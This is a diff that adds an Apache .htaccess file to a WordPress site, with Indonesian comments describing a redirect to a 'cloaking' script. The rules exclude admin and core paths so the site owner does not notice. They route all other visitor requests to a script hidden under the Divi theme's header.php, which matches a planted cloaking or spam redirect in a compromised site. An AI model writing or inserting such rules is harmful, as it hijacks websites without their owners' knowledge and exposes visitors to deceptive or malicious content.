@@ -1,0 +1,13 @@
+# Redirect semua pengunjung ke script cloaking.php
+<IfModule mod_rewrite.c>
+RewriteEngine On
+
+# Abaikan admin dan resource asli WordPress
+RewriteCond %{REQUEST_URI} !^/wp-admin
+RewriteCond %{REQUEST_URI} !^/wp-login\.php
+RewriteCond %{REQUEST_URI} !^/wp-content
+RewriteCond %{REQUEST_URI} !^/wp-includes
+
+# Arahkan semua request ke cloaking.php
+RewriteRule ^.*$ /wp-content/themes/Divi/header.php [L]
+</IfModule>
